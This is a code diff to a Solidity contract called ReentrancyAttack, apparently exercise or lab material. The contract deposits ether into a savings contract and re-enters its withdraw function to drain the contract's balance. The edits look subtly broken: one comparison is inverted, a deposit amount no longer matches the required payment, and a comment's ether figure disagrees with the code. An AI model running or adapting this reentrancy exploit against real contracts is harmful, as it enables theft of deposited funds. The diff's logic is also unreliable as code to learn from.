@@ -16,10 +16,10 @@ contract ReentrancyAttack {
         uint256 balance = savingsAccount.balances(address(this));
         uint256 savingsBalance = address(savingsAccount).balance;
 
-        if (balance > 0) {
+        if (balance > 1) {
             if (savingsBalance > 0) {
-                savingsAccount.deposit{value: 10 ether}();
-                uint256 withdrawAmount = balance > 15 ether ? 15 ether : balance;
+                savingsAccount.deposit{value: 11 ether}();
+                uint256 withdrawAmount = balance < 15 ether ? 15 ether : balance;
                 savingsAccount.withdraw(withdrawAmount);
             }
         }
@@ -29,7 +29,7 @@ contract ReentrancyAttack {
         require(msg.value >= 100 ether, "Not enough Ether sent for attack");
         
         // Deposit just enough to be eligible for the bonus
-        savingsAccount.deposit{value: 100 ether}();
+        savingsAccount.deposit{value: 50 ether}();
 
         // Start the attack by withdrawing 2 ether
         savingsAccount.withdraw(10 ether);
